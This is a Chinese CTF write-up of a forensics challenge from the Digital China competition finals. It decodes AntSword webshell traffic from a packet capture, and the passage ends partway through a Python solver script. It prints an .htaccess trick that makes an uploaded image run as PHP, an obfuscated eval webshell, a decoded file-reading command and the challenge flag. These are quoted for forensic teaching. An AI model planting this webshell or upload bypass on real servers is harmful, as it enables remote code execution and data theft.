---
title: 数字中国数字安全赛道网络安全团体赛决赛WP
url: https://mp.weixin.qq.com/s/6HR75KLuKY46NPMzxvZdDA
source: Doonsec's feed
date: 2026-05-01
fetch_date: 2026-05-02T04:57:28.516797
---

# 数字中国数字安全赛道网络安全团体赛决赛WP

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/L5p13fmOxK1FEPw7ViaofEkJn2YyE3Rf535kaw7YicopicljFyPPWO6Uv1hhSCh7VgQhafDHCxpfhA75icAcNbEbFkaJXRic1B6iaXTjSnFe3LGW0/0?wx_fmt=jpeg)

# 数字中国数字安全赛道网络安全团体赛决赛WP

原创

hcn0&当归&GuQing
hcn0&当归&GuQing

Zer0day安全

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

这个比赛是我们第一次进入线下赛决赛，属于是误闯天家了，这个wp为赛后复盘wp

# Web

web有一道无附件题无法复现，另外一道有附件的配置环境的时候有点问题，所以web方向的wp就先不写了，环境能起来之后会补上

eg：比赛的时候看其他大佬web题也都爆零确实没想到

# MISC

## Sword

题如其名，看出来是蚁剑的流量分析题，在比赛的时候也是脑抽了光想着去分析sword后面的内容了结果搞了半天没搞出来，有点可惜

### 文件分析

直接打开流量包分析

![](https://mmbiz.qpic.cn/mmbiz_png/L5p13fmOxK0zYSkschJx0YBsia4gDjvFNHK1ssyRXBGqtVtKoE9CASxtHXickW1YrZvrTqicl6g1xvVicSlibR6iaIc2q7HNjG0TA2zNmDrPyCbK8/640?wx_fmt=png&from=appmsg)

img

过滤看一下http和里面的内容能够得知：

![](https://mmbiz.qpic.cn/mmbiz_png/L5p13fmOxK0ppd1MwBd2wuFYx2KxwFKkrvoFqqo8JKb2bMia8eIUyPA9soc7wDDR1PyqUBGicmFMk7JqCT7FhsIDiaqUnroBW8mfY2506GnticM/640?wx_fmt=png&from=appmsg)

img

先是上传了一个.htaccess

```
<FilesMatch "shell.jpg">
SetHandler application/x-httpd-php
</FilesMatch>
```

内容为让服务器将shell.jpg当php文件执行

然后后面看到上传了一个shell.jpg，但其实内容如下：

![](https://mmbiz.qpic.cn/mmbiz_png/L5p13fmOxK11ZbPsbCEdTSqhHwnrz2b3C7rmqSnicSf6CjB8WxXozBgW2CSM2fP8Id4p4uQhDCukvLU02T2yPp0icqXXmE59RJwwjEnvgV5XQ/640?wx_fmt=png&from=appmsg)

img

```
<?php
$number=7;
function decoder($s,$number){
    $res = '';
    $s = rtrim($s,'/');
    $s = explode('/',$s);
    foreach ($s as $key => $value) {
        $res .= chr($value^$number);
    }
    return base64_decode($res);
}
$a = decoder($_POST['sword'],$number);
@eval($a)
?>
```

能看出来是一串php代码

对代码进行分析，发现对应的的解码逻辑：

1. 1. 把字符串按 / 分开
2. 2. 每一段转整数
3. 3. 每个整数 XOR 7
4. 4. 拼回字符
5. 5. 再做 Base64 解码
6. 6. 解出来的 PHP 再 eval

然后对http响应进行分析，找长度比较大的包看看

![](https://mmbiz.qpic.cn/sz_mmbiz_png/L5p13fmOxK0cAuGLGX6ImQeMLTsoVmL4icalQW1vAdnXTAvTvMjdEIkAdLiboibcwNtIs170q56elcOQKsRNJJC4fwEoibWXLNTUUTnhcibibR2pU/640?wx_fmt=png&from=appmsg)

img

![](https://mmbiz.qpic.cn/sz_mmbiz_png/L5p13fmOxK10YTlxpYGkjv1hlm6V09uWfmRFdwDxry3PNc7XxTKstP70HFOKTthj1lpUOqFCsrGkYh7gEfAShGrW2jU8vZsrrhFEnP2yjfo/640?wx_fmt=png&from=appmsg)

img

看到这个包在sword前面有一坨东西：

```
b06cc83d78a942=YLL2Jpbi9zaA%3D%3D&if39e5bed97867=q1&k483d94ac027f=8CY2QgIi92YXIvd3d3L2h0bWwvZmxhZyI7b2QgLUFuIC10eDEgLXYgZmxhZy5waHA7ZWNobyBkYmJiNTMwMmQ0ZDQ7cHdkO2VjaG8gODY2MDk5&
```

这些东西，前面没什么用，就是基本的

```
k483d94ac027f=8CY2QgIi92YXIvd3d3L2h0bWwvZmxhZyI7b2QgLUFuIC10eDEgLXYgZmxhZy5waHA7ZWNobyBkYmJiNTMwMmQ0ZDQ7cHdkO2VjaG8gODY2MDk5
```

8c为随机字符，去掉之后扔赛博厨子

![](https://mmbiz.qpic.cn/sz_mmbiz_png/L5p13fmOxK0yvZUyp9zKsZicS5Imrpb9guuRgGiaz6W3CwCnI6mORMo2kicwa2xHlfVgSRz1ALY70URIARDM2VhWiaKJLjDfsx0fxMjqfYibXUiaQ/640?wx_fmt=png&from=appmsg)

img

这样能看到最后实际执行的系统命令如下：

```
cd "/var/www/html/flag";
od -An -tx1 -v flag.php;
echo dbbb5302d4d4;
pwd;
echo 866099
```

也就是读出来/var/www/html/flag/flag.php

而服务器返回就应该是flag.php的内容，如下图

![](https://mmbiz.qpic.cn/sz_mmbiz_png/L5p13fmOxK3SMOIIUkhWuSm7ULaF6qsmwPHBXBDGdNnZTicMUMpk0wr6lam7cFwLuwnNAaDHkSB1MfUsr8hJQicHKBVUPpiaibHKib6EdwsTrpIo/640?wx_fmt=png&from=appmsg)

img

按照上传的shell.jpg的解法

把/去掉在和7异或，再base64解码得到如下内容：

```
3c 3f 70 68 70 0a 24 66 6c 61 67 20 3d 20 27 31
34 36 20 31 35 34 20 31 34 31 20 31 34 37 20 31
37 33 20 36 32 20 31 34 33 20 31 34 32 20 37 31
20 36 33 20 36 36 20 31 34 33 20 31 34 36 20 35
35 20 36 31 20 31 34 31 20 36 34 20 31 34 32 20
35 35 20 36 34 20 37 30 20 31 34 33 20 36 30 20
35 35 20 36 33 20 31 34 33 20 31 34 34 20 31 34
33 20 35 35 20 37 30 20 36 37 20 31 34 33 20 36
32 20 31 34 32 20 31 34 31 20 31 34 36 20 31 34
34 20 37 30 20 31 34 36 20 36 31 20 36 37 20 31
37 35 27 3b 0a 3f 3e 0a
dbbb5302d4d4
/var/www/html/flag
866099
```

前面的内容是16进制，再把它转成文本

```
<?php
$flag = '146 154 141 147 173 62 143 142 71 63 66 143 146 55 61 141 64 142 55 64 70 143 60 55 63 143 144 143 55 70 67 143 62 142 141 146 144 70 146 61 67 175';
?>
```

flag里面数字八进制ASCLL，再继续解码可得到flag

### Flag

flag{2cb936cf-1a4b-48c0-3cdc-87c2bafd8f17}

### 一键梭哈脚本

```
from __future__ import annotations

import argparse
import base64
import gzip
import re
import socket
import struct
import sys
import urllib.parse
from dataclasses import dataclass
from pathlib import Path

DEFAULT_PCAP_CANDIDATES = [
    Path(
        r"d:\A自己的材料A\HGC\CTF比赛题及wp\A参加的CTF比赛\数字中国线下\MISC\a2b5ce178fdf48c4822ee9156abd3a11\1.pcapng"
    ),
    Path("1.pcapng"),
]

@dataclass
class HttpMessage:
    start_line: str
    headers: dict[bytes, bytes]
    body: bytes

@dataclass
class SessionItem:
    request_line: str
    command: str | None
    response_text: str | None

def pad_base64(data: str) -> str:
    return data + ("=" * (-len(data) % 4))

def parse_pcapng_packets(path: Path) -> list[tuple[int, bytes]]:
    raw = path.read_bytes()
    pos = 0
    ifaces: list[int] = []
    packets: list[tuple[int, bytes]] = []

    while pos + 12 <= len(raw):
        block_type, block_len = struct.unpack_from("<II", raw, pos)
        if block_len < 12 or pos + block_len > len(raw):
            raise ValueError(f"pcapng block is truncated near offset 0x{pos:x}")

        if block_type == 0x00000001:
            linktype = struct.unpack_from("<H", raw, pos + 8)[0]
            ifaces.append(linktype)
        elif block_type == 0x00000006:
            iface_id, _, _, caplen, _ = struct.unpack_from("<IIIII", raw, pos + 8)
            if iface_id >= len(ifaces):
                raise ValueError(f"invalid interface id {iface_id} in EPB")
            pkt = raw[pos + 28 : pos + 28 + caplen]
            packets.append((ifaces[iface_id], pkt))

        pos += block_len

    return packets

def canonical_flow(a: tuple[str, int], b: tuple[str, int]) -> tuple[tuple[str, int], tuple[str, int]]:
    return (a, b) if a <= b else (b, a)

def extract_tcp_streams(
    packets: list[tuple[int, bytes]]
) -> dict[tuple[tuple[str, int], tuple[str, int]], dict[int, list[tuple[int, bytes]]]]:
    streams: dict[tuple[tuple[str, int], tuple[str, int]], dict[int, list[tuple[int, bytes]]]] = {}

    for linktype, pkt in packets:
        if linktype != 1 or len(pkt) < 54:
            continue
        if struct.unpack_from("!H", pkt, 12)[0] != 0x0800:
            continue

        ip = pkt[14:]
        if not ip:
            continue

        version = ip[0] >> 4
        if version != 4:
            continue

        ihl = (ip[0] & 0x0F) * 4
        total_len = struct.unpack_from("!H", ip, 2)[0]
        if len(ip) < total_len or len(ip) < ihl + 20:
            continue
        if ip[9] != 6:
            continue

        src_ip = socket.inet_ntoa(ip[12:16])
        dst_ip = socket.inet_ntoa(ip[16:20])
        tcp = ip[ihl:total_len]
        src_port, dst_port, seq = struct.unpack_from("!HHI", tcp, 0)
        tcp_len = (tcp[12] >> 4) * 4
        if len(tcp) < tcp_len:
            continue

        payload = tcp[tcp_len:]
        if not payload:
            continue

        ep1 = (src_ip, src_port)
        ep2 = (dst_ip, dst_port)
        key = canonical_flow(ep1, ep2)
        direction = 0 if key[0] == ep1 else 1
        streams.setdefault(key, {0: [], 1: []})[direction].append((seq, payload))

    return streams

def reassemble_stream(segments: list[tuple[int, bytes]]) -> bytes:
    data = bytearray()
    current_end: int | None = None

    for seq, payload in sorted(segments, key=lambda item: item[0]):
        if current_end is None:
            data.extend(payload)
            current_end = seq + len(payload)
            continue

        if seq >= current_end:
            data.extend(payload)
            current_end = seq + len(payload)
            continue

        overlap = current_end - seq
        if overlap < len(payload):
            data.extend(payload[overlap:])
            current_end = seq + len(payload)

    return bytes(data)

def parse_http_messages(buffer: bytes, response: bool) -> list[HttpMessage]:
    pos = 0
    messages: list[HttpMessage] = []
    methods = (b"GET ", b"POST ", b"HEAD ", b"PUT ", b"DELETE ", b"OPTIONS ")

    while pos < len(buffer):
        if response:
            start = buffer.find(b"HTTP/", pos)
        else:
  ...